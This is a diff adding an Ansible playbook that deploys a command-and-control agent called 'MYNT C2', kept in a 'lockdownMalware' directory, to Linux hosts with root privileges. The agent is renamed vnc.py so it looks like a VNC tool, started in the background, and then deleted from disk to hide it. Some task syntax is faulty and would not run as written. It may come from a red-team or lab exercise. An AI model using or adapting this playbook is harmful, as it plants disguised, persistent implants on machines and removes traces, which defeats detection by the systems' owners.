@@ -1,0 +1,26 @@
+---
+- name: Deploy MYNT C2 Agent to Linux Hosts
+  hosts: linux
+  become: true
+
+  tasks:
+    - name: Copy file to remote host
+      ansible.builtin.copy:
+        src: ~/lockdownMalware/MYNT_C2/agent.py
+        dest: /tmp/vnc.py
+        owner: root
+        group: root
+        mode: "0755"
+    
+    - name: start process
+      ansible.builtin.command: nohup python3 /tmp/vnc.py > /tmp/vnc.log 2>&1 &
+      register: ls_output.vnc_pid
+
+    - name: Show command output
+      ansible.builtin.debug:
+        var: ls_output.vnc_pid
+      
+    - name: Run a command
+      ansible.builtin.command: rm /tmp/vnc.py
+      register: ls_output.rm_output
+      
